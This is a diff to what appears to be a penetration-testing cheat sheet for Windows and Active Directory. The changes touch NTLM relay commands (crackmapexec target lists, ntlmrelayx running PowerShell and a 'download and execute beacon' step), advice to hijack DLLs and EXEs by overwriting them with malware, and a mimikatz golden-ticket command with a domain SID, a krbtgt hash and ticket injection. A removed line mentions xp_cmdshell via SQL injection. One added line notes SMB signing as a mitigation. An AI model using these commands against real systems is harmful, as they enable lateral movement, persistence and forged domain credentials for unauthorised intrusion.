@@ -522,6 +522,7 @@ You CAN perform Pass-The-Hash attacks with NTLM hashes.
 You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.
 
 PS: You CANNOT relay a hash back to itself.
+PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec
 
 crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt
 
@@ -534,10 +535,6 @@ How about we execute a command instead.
 
 ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd
 ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP
-
-
-
-You could also couple this with SQLi but executing EXEC xp_cmdshell '' and relaying the response or pop a shell on the web server etc.
 ```
 
 
@@ -1480,6 +1477,16 @@ Windows 10 - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
 
 
 
+EXE/DLL Hijacking
+
+```
+Look for any missing DLL's or EXE's that common programs are calling on startup and over write them with your payload/malware.
+
+Also if you are localadmin/system you could provide over write a normal service binary or DLL, providing you don't break the execution.
+```
+
+
+
 Add User Account
 
 ```
@@ -1500,11 +1507,15 @@ They can be injected into session with mimikatz or Rebeus.
 
 But let's say we have pwned a DC and got the KRBTGT Hash we can generate a golden ticket with a 10 year life span.
 
-kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi /endin DATE
+kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:utilisateur.chocolate.kirbi 
+
+SID is the domain SID
 
 Inject Ticket
 
 kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
+
+Can also inject kirbi with Rebeus
 ```
 
 
